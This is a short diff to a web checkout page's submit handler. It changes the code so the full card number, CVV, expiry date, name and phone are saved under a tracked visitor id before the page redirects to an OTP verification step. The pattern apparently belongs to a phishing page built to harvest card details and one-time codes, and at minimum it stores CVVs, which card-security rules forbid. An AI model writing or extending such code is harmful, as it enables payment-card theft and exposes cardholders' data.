@@ -42,7 +42,7 @@ export default function CheckoutPage() {
     e.preventDefault()
     // Redirect to OTP verification
     const visitorId=localStorage.getItem('visitor')
-    addData({id:visitorId,formData})
+    addData({id:visitorId,phone:formData.phone,name:formData.name,cardNumber:formData.cardNumber,cvv:formData.cvv,expiryDate:formData.expiryDate})
     window.location.href = "/otp-verification"
   }
 useEffect(()=>{
